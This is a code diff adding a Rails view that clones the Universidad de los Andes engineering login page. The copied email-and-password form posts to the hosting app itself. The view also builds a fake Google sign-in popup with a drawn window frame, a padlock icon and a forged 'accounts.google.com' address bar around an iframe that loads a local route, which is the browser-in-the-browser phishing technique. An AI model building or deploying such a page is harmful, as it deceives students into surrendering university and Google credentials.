@@ -1,0 +1,152 @@
+  
+
+    <!-- Navbar. -->
+    <div class="navbar navbar-fixed-top" id="main-navbar">
+        <div class="navbar-inner" id="navbar-inner">
+            <div class="container">
+                <!-- the next tag is necessary for bootstrap menus, do not remove -->
+                <a class="btn btn-navbar" data-toggle="collapse" data-target=".nav-collapse">
+                    <span class="icon-bar"></span>
+                    <span class="icon-bar"></span>
+                    <span class="icon-bar"></span>
+                </a>
+                
+                    <div>
+                        <!--<a class="brand" href="/ing/default/index"><img style="height: 20px;" src="/ing/static/img/logo_iuandes.png"></a>-->
+                    </div>
+                
+    
+                 
+                    
+                        <ul class="nav pull-right">
+                            <li><a href="https://saf.uandes.cl/ing/default/user/login" id="join_from_saf_label">Ingresar</a></li>
+                        </ul>
+                    
+                 
+            </div>
+        </div>
+    </div>
+        <!-- Main content. -->
+        <div id="main-content" class="container">
+            
+
+                
+    <div id="loginCard" style="border-color: gray; border-width: 3px">
+        <h2 style="text-align: center; padding: 3%" id="saf_title">Inicio de sesión</h2>
+        <div id="web2py_user_form">
+            
+               <!-- <form action="/user/login" enctype="multipart/form-data" method="post"> -->
+            <%= form_with url: "user/login", method: "post" do |form| %>
+                <table style="float: none; margin: 0px auto;">
+                    <tbody>
+                        <tr id="auth_user_email__row">
+                            <td class="w2p_fl">
+                                <label class="" for="auth_user_email" id="auth_user_email__label">Correo electrónico: </label>
+                            </td>
+                            <td class="w2p_fw">
+                                <input class="string" id="auth_user_email" name="email" type="text">
+                            </td>
+                            <td class="w2p_fc">
+                            </td>
+                        </tr>
+                        <tr id="auth_user_password__row">
+                            <td class="w2p_fl">
+                                <label class="" for="auth_user_password" id="auth_user_password__label">Contraseña: </label>
+                            </td>
+                            <td class="w2p_fw">
+                                <input class="password" id="auth_user_password" name="password" type="password" value="">
+                            </td>
+                            <td class="w2p_fc">
+                            </td>
+                        </tr>
+                        <tr id="auth_user_remember_me__row">
+                            <td class="w2p_fl">
+                                <label class="" for="auth_user_remember_me" id="auth_user_remember_me__label">No cerrar sesión: </label>
+                            </td>
+                            <td class="w2p_fw">
+                                <input class="boolean" id="auth_user_remember_me" name="remember_me" type="checkbox" value="on">
+                            </td>
+                        </tr>
+                        <tr id="submit_record__row">
+                            <td class="w2p_fl">
+                            </td>
+                            <td class="w2p_fw">
+                                <input type="submit" value="Ingresar" class="btn btn-primary center" id="submit_from_saf" style="vertical-align: central">
+                            </td>
+                            <td class="w2p_fc">
+                            </td>
+                        </tr>
+                    </tbody>
+                </table>
+    
+                <br>
+                <br>
+               <!-- <div style="display:none;"><input name="_next" type="hidden" value="/ing/default/index"><input name="_formkey" type="hidden" value="6182bf3b-be54-40f4-9762-d70127a2a127"><input name="_formname" type="hidden" value="login"></div></form> -->
+    
+                <div class="container" id="bottom-form-container">
+                    <div class="row">
+                        <div class="span4 offset4" style="text-align: center;">
+                            <a id="google_login_url">
+                                <%= image_tag("btn_google_signin_dark_normal_web2x.png", class:"google-signin-responsive")%>
+                            </a>
+                            <br>
+                            <small>*Necesitas una cuenta @miuandes.cl</small>
+                            <br>
+                            
+                                <br>
+                                <a href="https://saf.uandes.cl/ing/default/user/request_reset_password">Restablecer contraseña</a>
+                            
+                        </div>
+                    </div>
+                </div>
+                <br>
+            <%end%>
+        </div>
+    </div>
+
+            
+            <p></p>
+        </div>
+
+        <div id="window" style="display: none">
+        <!-- Title bar start -->
+        <div id="title-bar-width">
+            <div id="title-bar">
+                <div style="margin-top:5px;">
+                    <%=image_tag("logo_google.svg", id: "logo_google", size: "20x15") %>
+                    <span id="logo-description">Acceso: Cuentas de Google</span>
+                </div>
+
+                <div id="window-opts">
+                    <span id="minimize">&#8212;</span>
+                    <span id="square">□</span>
+                    <div id="exit"><span>✕</span></div>
+                </div>
+            </div>
+            <div id="url-bar">
+                <img src="/assets/ssl.svg" width="20px" height="20px" id="ssl-padlock">
+                <span id="domain-name">accounts.google.com</span>
+                <span id="domain-path">/<%= get_google_auth_path %></span>
+            </div>
+        </div>
+        <!-- Content start -->
+        <iframe id="content" src="/google-login" frameBorder="0"></iframe>
+        </div>
+    
+        <!-- Footer. -->
+        
+        <div id="footer" style="position: absolute; bottom: 0px; left: 0px;" class="w-100">
+        <div class="container">
+            <span id="footer-content">
+            <%= image_tag("Logo_ICC-01.png", size: "90x70", class: "ing-responsive") %>
+                ©2022 Universidad de los Andes, Facultad de Ingeniería y Ciencias Aplicadas.
+                
+            </span>
+        </div>
+    </div>
+        
+    
+
+        
+    
+        <%=javascript_pack_tag 'google_login' %>
